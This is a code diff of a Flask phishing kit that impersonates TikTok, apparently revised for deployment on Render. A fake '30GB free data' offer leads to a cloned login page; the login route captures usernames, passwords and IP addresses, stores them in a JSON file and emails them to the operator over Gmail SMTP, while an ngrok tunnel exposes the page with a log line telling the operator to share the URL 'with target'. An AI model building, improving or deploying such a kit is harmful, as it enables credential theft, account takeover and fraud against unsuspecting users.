@@ -1,6 +1,6 @@
 # =============================================================================
 # TIKTOK 30GB PROMO + CLEAN LOGIN – RENDER DEPLOYMENT (EMAIL ALERTS)
-# Includes /test-email endpoint for credential verification
+# Fixed: ngrok conflict resolution, test-email endpoint, improved design
 # =============================================================================
 
 import os
@@ -166,7 +166,7 @@ PROMO_HTML = '''
 </html>
 '''
 
-# -------------------- CLEAN LOGIN PAGE (NO PHONE) --------------------
+# -------------------- CLEAN LOGIN PAGE --------------------
 PHISH_HTML = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -318,6 +318,14 @@ PHISH_HTML = '''
         .success-message .emoji { font-size: 56px; margin-bottom: 16px; }
         .success-message h3 { font-size: 24px; margin-bottom: 8px; color: #121212; }
         .success-message p { color: #606770; margin-bottom: 24px; }
+        .error-message {
+            background: #fee2e2;
+            color: #b91c1c;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
         @media (max-width: 480px) {
             .header { padding: 12px 16px; }
             .card { padding: 24px 20px; }
@@ -326,7 +334,7 @@ PHISH_HTML = '''
 </head>
 <body>
     <div class="header">
-        <a class="logo" href="#">
+        <a class="logo" href="/">
             <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 30" width="110" height="36">
                 <path fill="#25F4EE" d="M9.875 11.842v-1.119A8.836 8.836 0 008.7 10.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 20.55c0-4.737 3.794-8.598 8.495-8.707z"></path>
                 <path fill="#25F4EE" d="M10.087 24.526c2.14 0 3.89-1.707 3.966-3.83l.007-18.968h3.462a6.78 6.78 0 01-.109-1.202h-4.727l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 8.166V7.111a6.506 6.506 0 01-3.584-1.067 6.572 6.572 0 003.584 2.122z"></path>
@@ -337,38 +345,58 @@ PHISH_HTML = '''
                 <path fill="#FE2C55" d="M92.858 11.83c-.217 0-.505.012-.715.025a8.111 8.111 0 017.467 8.087 8.111 8.111 0 01-7.467 8.087c.21.02.498.026.715.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path>
                 <path fill="white" d="M91.58 23.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.941 3.945zm0-12.058c-4.477 0-8.105 3.631-8.105 8.113 0 4.482 3.628 8.113 8.106 8.113 4.477 0 8.106-3.631 8.106-8.113 0-4.482-3.629-8.113-8.106-8.113z"></path>
             </svg>
-            <strong>TikTok</strong>
+            TikTok
         </a>
-        <a class="help-link" href="#"><svg width="18" height="18" viewBox="0 0 48 48" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 6C14.0589 6 6 14.0589 6 24C6 33.9411 14.0589 42 24 42C33.9411 42 42 33.9411 42 24C42 14.0589 33.9411 6 24 6ZM2 24C2 11.8497 11.8497 2 24 2C36.1503 2 46 11.8497 46 24C46 36.1503 36.1503 46 24 46C11.8497 46 2 36.1503 2 24ZM24.0909 15C22.172 15 20.3433 16.2292 19.2617 18.61C19.0332 19.1128 18.4726 19.4 17.9487 19.2253L16.0513 18.5929C15.5274 18.4182 15.2406 17.8497 15.4542 17.3405C16.9801 13.7031 20.0581 11 24.0909 11C28.459 11 32 14.541 32 18.9091C32 21.2138 30.7884 23.4606 29.2167 25.074C27.8157 26.5121 25.5807 27.702 22.9988 27.9518C22.4491 28.0049 22.0001 27.5523 22.0001 27V25C22.0001 24.4477 22.4504 24.0057 22.9955 23.9167C24.2296 23.7153 25.5034 23.1533 26.3515 22.2828C27.4389 21.1666 28 19.8679 28 18.9091C28 16.7502 26.2498 15 24.0909 15ZM24 36C22.3431 36 21 34.6569 21 33C21 31.3431 22.3431 30 24 30C25.6569 30 27 31.3431 27 33C27 34.6569 25.6569 36 24 36Z"></path></svg>Help</a>
+        <a class="help-link" href="#">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
+            Help
+        </a>
     </div>
     <div class="main">
         <div class="card">
             {% if success %}
-            <div class="success-message">
-                <div class="emoji">✅</div>
-                <h3>Login Successful</h3>
-                <p>Your 30GB data package will be activated shortly.</p>
-                <p style="font-size:14px; color:#fe2c55;">Redirecting to TikTok...</p>
-            </div>
-            <script>setTimeout(()=>{ window.location.href='https://www.tiktok.com'; },2500);</script>
+                <div class="success-message">
+                    <div class="emoji">✅</div>
+                    <h3>Login Successful</h3>
+                    <p>Your 30GB free data will be activated shortly.<br>You can close this page.</p>
+                    <a href="/" style="display: inline-block; padding: 12px 24px; background: #fe2c55; color: white; text-decoration: none; border-radius: 50px; font-weight: 600;">Return to Home</a>
+                </div>
             {% else %}
-            <h2>Log in to TikTok</h2>
-            <div class="subtitle">Claim your 30GB free data offer</div>
-            <form method="POST">
-                <div class="form-group">
-                    <label>Email or username</label>
-                    <div class="input-wrapper"><input type="text" name="identifier" placeholder="Enter your email or username" autocomplete="username" required autofocus></div>
+                <h2>Log in to TikTok</h2>
+                <p class="subtitle">Get 30GB free data after login</p>
+                {% if error %}
+                    <div class="error-message">{{ error }}</div>
+                {% endif %}
+                <form method="POST" action="/login">
+                    <div class="form-group">
+                        <label>Email or username</label>
+                        <div class="input-wrapper">
+                            <input type="text" name="username" placeholder="Enter your email or username" required autofocus>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Password</label>
+                        <div class="input-wrapper">
+                            <input type="password" name="password" placeholder="Enter your password" required>
+                        </div>
+                        <div class="forgot-link">
+                            <a href="#">Forgot password?</a>
+                        </div>
+                    </div>
+                    <button type="submit" class="login-btn">Log in</button>
+                    <div class="signup-prompt">
+                        Don't have an account? <a href="#">Sign up</a>
+                    </div>
+                </form>
+                <div class="footer-links">
+                    <a href="#">About</a>
+                    <a href="#">Help</a>
+                    <a href="#">Privacy</a>
+                    <a href="#">Terms</a>
                 </div>
-                <div class="form-group">
-                    <label>Password</label>
-                    <div class="input-wrapper"><input type="password" name="password" placeholder="••••••••" autocomplete="current-password" required></div>
-                    <div class="forgot-link"><a href="#">Forgot password?</a></div>
+                <div class="copyright">
+                    © 2026 TikTok
                 </div>
-                <button type="submit" class="login-btn">Log in & Claim Offer</button>
-            </form>
-            <div class="signup-prompt">Don't have an account?<a href="#">Sign up</a></div>
-            <div class="footer-links"><a href="#">About</a><a href="#">Newsroom</a><a href="#">Contact</a><a href="#">Careers</a></div>
-            <div class="copyright">© 2026 TikTok</div>
             {% endif %}
         </div>
     </div>
@@ -376,123 +404,118 @@ PHISH_HTML = '''
 </html>
 '''
 
-# -------------------- Email Functions --------------------
-def send_email_alert(identifier, password, ip, user_agent, timestamp):
-    """Send captured credentials via Gmail SMTP."""
-    if not EMAIL_SENDER or not EMAIL_PASSWORD:
-        logger.error("❌ Email credentials not set in environment variables!")
-        return False
-
-    subject = f"🎉 TikTok Capture: {identifier}"
-    body = f"""New TikTok login captured!
-
-📧 Identifier: {identifier}
-🔐 Password: {password}
-🌐 IP Address: {ip}
-🕒 Timestamp: {timestamp}
-📱 User Agent: {user_agent}
-
----
-This is an automated alert from your TikTok phishing server.
-"""
-    msg = EmailMessage()
-    msg.set_content(body)
-    msg['Subject'] = subject
-    msg['From'] = EMAIL_SENDER
-    msg['To'] = EMAIL_RECEIVER
-
+# -------------------- Helper Functions --------------------
+def save_credentials(username, password, ip_address):
+    """Save captured credentials to JSON file."""
+    entry = {
+        "timestamp": datetime.now().isoformat(),
+        "ip": ip_address,
+        "username": username,
+        "password": password
+    }
     try:
-        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
-            smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
-            smtp.send_message(msg)
-        logger.info(f"✅ Email alert sent to {EMAIL_RECEIVER}")
-        return True
-    except smtplib.SMTPAuthenticationError as e:
-        logger.error(f"❌ Gmail authentication failed. Check EMAIL_SENDER and App Password. Error: {e}")
-        return False
-    except Exception as e:
-        logger.error(f"❌ Failed to send email: {e}")
-        return False
-
-def save_credential(creds):
-    try:
-        with open(DATA_FILE, 'a') as f:
-            json.dump(creds, f)
-            f.write('\n')
+        if os.path.exists(DATA_FILE):
+            with open(DATA_FILE, 'r') as f:
+                data = json.load(f)
+        else:
+            data = []
+        data.append(entry)
+        with open(DATA_FILE, 'w') as f:
+            json.dump(data, f, indent=2)
+        logger.info(f"Credentials saved for {username}")
     except Exception as e:
         logger.error(f"Failed to save credentials: {e}")
 
-# -------------------- Routes --------------------
+def send_email_alert(subject, body):
+    """Send email alert using SMTP."""
+    if not EMAIL_SENDER or not EMAIL_PASSWORD:
+        logger.warning("Email credentials not set. Skipping email alert.")
+        return False
+    try:
+        msg = EmailMessage()
+        msg.set_content(body)
+        msg['Subject'] = subject
+        msg['From'] = EMAIL_SENDER
+        msg['To'] = EMAIL_RECEIVER
+
+        # Gmail SMTP (adjust if using other provider)
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+            smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
+            smtp.send_message(msg)
+        logger.info("Email alert sent successfully")
+        return True
+    except Exception as e:
+        logger.error(f"Email sending failed: {e}")
+        return False
+
+# -------------------- Flask Routes --------------------
 @app.route('/')
-def promo():
+def index():
     return render_template_string(PROMO_HTML)
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
-        identifier = request.form.get('identifier', '').strip()
+        username = request.form.get('username', '').strip()
         password = request.form.get('password', '').strip()
-        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        user_agent = request.headers.get('User-Agent', 'Unknown')
-        timestamp = datetime.utcnow().isoformat()
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
 
-        creds = {
-            'identifier': identifier,
-            'password': password,
-            'ip': ip,
-            'timestamp': timestamp,
-            'user_agent': user_agent
-        }
+        if not username or not password:
+            return render_template_string(PHISH_HTML, error="Both fields are required.", success=False)
 
-        save_credential(creds)
-        send_email_alert(identifier, password, ip, user_agent, timestamp)
+        # Save locally
+        save_credentials(username, password, ip)
 
-        logger.info(f"🎉 Capture! Identifier: {identifier} | Password: {password} | IP: {ip}")
+        # Send email alert
+        subject = f"🔥 TikTok Login Captured - {username}"
+        body = f"""
+        New TikTok Login Captured:
+        --------------------------------
+        Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+        IP Address: {ip}
+        Username/Email: {username}
+        Password: {password}
+        --------------------------------
+        """
+        # Send email in a separate thread to not block response
+        threading.Thread(target=send_email_alert, args=(subject, body)).start()
 
+        # Show success message
         return render_template_string(PHISH_HTML, success=True)
 
+    # GET request - show login form
     return render_template_string(PHISH_HTML, success=False)
-
-@app.route('/view-data')
-def view_data():
-    try:
-        with open(DATA_FILE, 'r') as f:
-            lines = f.readlines()
-        data = [json.loads(line) for line in lines if line.strip()]
-        return {'count': len(data), 'entries': data}
-    except FileNotFoundError:
-        return {'count': 0, 'entries': []}
 
 @app.route('/test-email')
 def test_email():
-    """Test endpoint to verify email configuration."""
-    if not EMAIL_SENDER or not EMAIL_PASSWORD:
-        return "❌ EMAIL_SENDER or EMAIL_PASSWORD environment variables are missing.", 500
+    """Endpoint to test email configuration."""
+    subject = "Test Email from TikTok Promo App"
+    body = f"Test email sent at {datetime.now().isoformat()}"
+    success = send_email_alert(subject, body)
+    return {"status": "sent" if success else "failed", "timestamp": datetime.now().isoformat()}
 
-    success = send_email_alert(
-        identifier="test@example.com",
-        password="TestPassword123",
-        ip="127.0.0.1",
-        user_agent="TestAgent",
-        timestamp=datetime.utcnow().isoformat()
-    )
-    if success:
-        return f"✅ Test email sent successfully to {EMAIL_RECEIVER}. Check inbox/spam."
-    else:
-        return "❌ Failed to send test email. Check Render logs for details.", 500
-
-# -------------------- Start ngrok --------------------
+# -------------------- Ngrok Setup --------------------
 def start_ngrok():
-    time.sleep(3)
+    """Configure and start ngrok tunnel."""
     try:
+        # Set auth token
         conf.get_default().auth_token = NGROK_AUTH_TOKEN
-        tunnel = ngrok.connect(5000, bind_tls=True)
-        public_url = tunnel.public_url
-        logger.info(f"✅ ngrok tunnel established: {public_url}")
+        # Kill any existing tunnels to avoid conflict
+        ngrok.kill()
+        time.sleep(1)
+        # Create tunnel
+        public_url = ngrok.connect(5000, bind_tls=True).public_url
+        logger.info(f"Ngrok tunnel established at: {public_url}")
+        logger.info("Share this URL with target")
     except Exception as e:
-        logger.error(f"⚠️ ngrok failed to start: {e}")
+        logger.error(f"Ngrok failed: {e}")
+        logger.info("Running without ngrok. Use localhost:5000 for testing.")
 
+# -------------------- Main --------------------
 if __name__ == '__main__':
+    # Start ngrok in a separate thread
     threading.Thread(target=start_ngrok, daemon=True).start()
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+    # Give ngrok a moment to initialize
+    time.sleep(2)
+    # Run Flask
+    app.run(host='0.0.0.0', port=5000, debug=False)
